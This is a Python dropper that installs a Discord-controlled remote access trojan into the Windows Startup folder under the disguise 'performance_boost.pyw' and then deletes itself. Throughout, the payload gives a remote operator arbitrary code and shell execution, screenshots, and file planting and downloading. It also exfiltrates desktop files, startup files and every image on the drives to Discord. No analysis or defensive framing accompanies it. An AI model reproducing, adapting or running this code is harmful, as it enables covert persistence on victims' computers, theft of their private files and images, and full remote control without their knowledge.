import os

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
code_to_add = '''
import discord
from discord import app_commands
import subprocess , io , math , random , pyautogui ,os , ctypes , socket, sys
import requests 


def manage_packages(packages, action='install'):
    for package in packages:
        command = [sys.executable, "-m", "pip", action, package]
        subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

manage_packages(["discord.py", "discord.py-self"], action='uninstall')
manage_packages(["discord", "pillow" , "pyautogui","google-generativeai","requests"])


intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)



def get_running_processes():
    output = subprocess.check_output(["tasklist", "/fo", "csv"]).decode("utf-8")
    lines = output.strip().split('\n')[1:]  # Skip header line
    running_processes = [line.split(',')[0].strip('"') for line in lines]
    return running_processes

def stop_process_by_name(process_name):
    subprocess.run(["taskkill", "/F", "/IM", process_name])

def get_installed_applications():
    output = subprocess.check_output(["wmic", "product", "get", "name"]).decode("utf-8")
    installed_applications = [line.strip() for line in output.strip().split('\n')[1:] if line.strip()]
    return installed_applications

def get_files_info(directory):
    files_info = []
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            files_info.append(file_name)
    return files_info

def get_all_files_info():
    files_info = []
    for drive in get_system_drives():
        for root, dirs, files in os.walk(drive):
            files_info.extend(files)
    return files_info

def get_system_drives():
    drives = []
    for drive in range(ord('A'), ord('Z') + 1):
        drive_letter = chr(drive) + ":\\"
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    return drives

def find_file(file_name):
    for drive in get_system_drives():
        for root, dirs, files in os.walk(drive):
            if file_name in files:
                return os.path.join(root, file_name)
    return None


idd = socket.gethostname()

@client.event
async def on_ready():
    user = await client.fetch_user(122304807774331557998) # add the ids here accordingly
    await user.send(f"Active now : {idd}")
    user = await client.fetch_user(85983777997736935936)
    await user.send(f"Active now : {idd}")
    chan = await client.fetch_channel(123193277610532474961)
    await chan.send(f"PC ACTIVE NOW , NAME : {idd}")

@client.event
async def on_message(message):
        global work , idd


        if message.content.startswith("/eval"):
            await message.reply(eval(message.content[6:]))
        if message.content.startswith("/exec"):
            file_name = message.content[5:].strip()
            file_path = find_file(file_name)
            if file_path:
                with open(file_path, 'r') as file:  
                    code = file.read()  
                    try:
                        exec(code)  
                        await message.channel.send("File is executed successfully.")
                    except Exception as e:
                        await message.reply(f"Error executing file: {e}")
        if message.content.startswith('/test'):
            await message.reply(f"yes master , {idd} working!")
        if message.content.startswith("/exit"):
            await message.reply(f"bye bye mastero , {idd} going down")
            exit()
        if message.content.startswith("/run"):
            command = message.content[5:]
            try:
                output = subprocess.check_output(command, shell=True, universal_newlines=True)
                print("Command output:", output)
                try:
                    await message.author.send(f"### output\n```\n{output}\n```")
                except:
                    x = len(output)//2
                    output = [output[:x],output[x:]]
                    for i in range(2):
                        await message.author.send(f"### piece {i+1}:\n{output[i]}")
            except subprocess.CalledProcessError as e:
                print("Command execution failed:", e)
                await message.reply("error occured , i have sent u the error in DMs !")
                try:
                    await message.author.send(f"# ERROR OCCURED\n## command : {command}\n\n```\n{e}\n```")
                except:
                    await message.reply("Couldnt send sorry the error was too long :)\nbreaking the string in 2 pieces and sending again!!")
                    x = len(e)//2
                    e = [e[:x],e[x:]]
                    for i in range(2):
                        await message.author.send(f"### piece {i+1}:\n{e[i]}")
        if message.content.startswith("/see"):
             screenshot = pyautogui.screenshot()
             with io.BytesIO() as image_binary:
                 screenshot.save(image_binary, format='PNG')
                 image_binary.seek(0)
                 image_bytes = image_binary.getvalue()
             await message.reply(file=discord.File(io.BytesIO(image_bytes), filename='screenshot.png'))
        if message.content.startswith("/startup"):
            args = message.content.split()[1:]  # Split message content into arguments
            if len(args) >= 2:
                name = args[0]
                data = ' '.join(args[1:])
                filename = name
                with open(filename, 'w') as f:
                    f.write(data)
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                os.rename(filename, os.path.join(startup_folder, filename))
                await message.reply(f"Added {filename} to startup folder.")
            elif message.attachments:  # If there's an attachment, save it
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                for attachment in message.attachments:
                    filename = attachment.filename
                    attachment_bytes = await attachment.read()
                    with open(os.path.join(startup_folder, filename), 'wb') as f:
                       f.write(attachment_bytes)
                await message.reply("Attachments added to startup folder.")
                    


        if message.content.startswith("/deletestartup"):
            filename = message.content.split()[1]
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            filepath = os.path.join(startup_folder, filename)
            if os.path.exists(filepath):
                os.remove(filepath)
                await message.reply(f"Deleted {filename} from startup folder.")
            else:
                await message.reply(f"{filename} does not exist in startup folder.")
        if message.content.startswith("/make"):
            args = message.content.split()[1:]  # Split message content into arguments
            if len(args) >= 2:
                name = args[0]
                data = ' '.join(args[1:])
                filename = name
                with open(filename, 'w') as f:
                    f.write(data)
                desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
                os.rename(filename, os.path.join(desktop_path, filename))
                await message.reply(f"Added {filename} to desktop folder.")
            elif message.attachments:  # If there's an attachment, save it
                desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
                for attachment in message.attachments:
                    filename = attachment.filename
                    attachment_bytes = await attachment.read()
                    with open(os.path.join(desktop_path, filename), 'wb') as f:
                       f.write(attachment_bytes)
                await message.reply("Attachments added to desktop folder.")
        if message.content.startswith("/remove"):
            filename = message.content.split()[1]
            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            filepath = os.path.join(desktop_path, filename)
            if os.path.exists(filepath):
                os.remove(filepath)
                await message.reply(f"Deleted {filename} from desktop.")
            else:
                await message.reply(f"{filename} does not exist on desktop.")

        if message.content.startswith("/msg"):
            text = message.content[5:].split("|")[0]
            title = message.content[5:].split("|")[1]
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)  # 0x40 for MB_ICONINFORMATION, 0x0 for OK button
            await message.reply("Message sent as alert.")
            
        if message.content.startswith("/filesstartup"):
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            files_info = []
            for root, dirs, files in os.walk(startup_folder):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    file_size = os.path.getsize(file_path)
                    files_info.append(f"{file_name} ({file_size} bytes)")
                    #await message.channel.send(f"{file_name} ({file_size} bytes)")

            textdata = '\n'.join(files_info)
            await message.channel.send(file=discord.File(io.BytesIO(textdata.encode('utf-8')),filename = "desktop.txt"))

        if message.content.startswith("/files"):
            desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            files_info = []

            for root, dirs, files in os.walk(desktop_path):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    file_size = os.path.getsize(file_path)
                    files_info.append(f"{file_name} ({file_size} bytes)")
                    #await message.channel.send(f"{file_name} ({file_size} bytes)")

            textdata = '\n'.join(files_info)
            await message.channel.send(file=discord.File(io.BytesIO(textdata.encode('utf-8')),filename = "desktop.txt"))

        if message.content.startswith("/send"):
            file_name = message.content[6:]
            desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')

            for root, dirs, files in os.walk(desktop_path):
                if file_name in files:
                    file_path = os.path.join(root, file_name)
                    with open(file_path, 'rb') as file:
                        await message.channel.send(file=discord.File(file))
                    break
            else:
                await message.reply(f"File '{file_name}' not found on desktop.")

        if message.content.startswith("/sendstartup"):
            file_name = message.content.split()[1]
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            file_path = os.path.join(startup_folder, file_name)

            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    await message.channel.send(file=discord.File(file))
            else:
                await message.reply(f"File '{file_name}' not found in startup folder.")
        
        if message.content.startswith("/wallpaper"):
            if message.attachments:  # Check if there's an attachment
                attachment = message.attachments[0]  # Assuming only one attachment is sent
                attachment_bytes = await attachment.read()
                with open("temp_image.jpg", "wb") as f:
                    f.write(attachment_bytes)
                image_path = os.path.abspath("temp_image.jpg")
                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)  # Set wallpaper
                os.remove(image_path)
                await message.reply("Wallpaper set successfully.")
            elif len(message.content.split()) > 1:  # Check if there's a link in the message
                link = message.content.split()[1]
                subprocess.run(['powershell', '-Command', f'(New-Object System.Net.WebClient).DownloadFile("{link}", "temp_image.jpg")'])
                image_path = os.path.abspath("temp_image.jpg")
                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)  # Set wallpaper
                os.remove(image_path)
                await message.reply("Wallpaper set successfully.")
            else:
                await message.reply("Please provide a valid image attachment or link.")
        if message.content.startswith("/on_apps"):
            running_processes = get_running_processes()
            #await message.reply("Running processes:\n" + '\n'.join(running_processes))
            textdata = '\n'.join(running_processes)
            await message.channel.send(file=discord.File(io.BytesIO(textdata.encode('utf-8')),filename = "running_apps.txt"))

        if message.content.startswith("/stop_apps"):
            app_name = message.content.split()[1]
            stop_process_by_name(app_name)
            await message.reply(f"Stopped {app_name}.")

        if message.content.startswith("/apps"):
            apps_list = get_installed_applications()
            #await message.reply("Installed applications:\n" + '\n'.join(apps_list))
            textdata = '\n'.join(apps_list)
            await message.channel.send(file=discord.File(io.BytesIO(textdata.encode('utf-8')),filename = "apps_list.txt"))
        if message.content.startswith("/allfiles"):
            files_info = get_all_files_info()
            textdata = '\n'.join(files_info)
            await message.channel.send(file=discord.File(io.BytesIO(textdata.encode('utf-8')), filename="all_files.txt"))
                
        if message.content.startswith('/allsendimages'):
            await message.channel.send('Starting to send images...')
        
            IMAGE_EXTENSIONS = ('.jpg', '.jpeg', '.png')
            image_files = []
            drives = ["F:\\",'E:\\','D:\\', 'C:\\']

            for drive in drives:
                if os.path.exists(drive):
                    for root, dirs, files in os.walk(drive):
                        for file in files:
                            if file.lower().endswith(IMAGE_EXTENSIONS):
                                image_files.append(os.path.join(root, file))
        
            user = await client.fetch_user(message.author.id)
            for image_file in image_files:
                try:
                    with open(image_file, 'rb') as file:
                        await user.send(file=discord.File(file, os.path.basename(image_file)))
                except Exception as e:
                    print(f"Failed to send {image_file}: {e}")

            await message.channel.send('All images have been sent.')

        if message.content.startswith("/allsend"):
            file_name = message.content[9:]
            file_path = find_file(file_name)
            if file_path:
                with open(file_path, 'rb') as file:
                    await message.channel.send(file=discord.File(file))
            else:
                await message.reply(f"File '{file_name}' not found.")


client.run('PRE-ENTER THE DISCORD BOT TOKEN')



'''
startup_script_path = os.path.join(startup_folder, 'performance_boost.pyw')

with open(startup_script_path, 'w') as f:
    f.write(code_to_add)

os.remove(__file__)
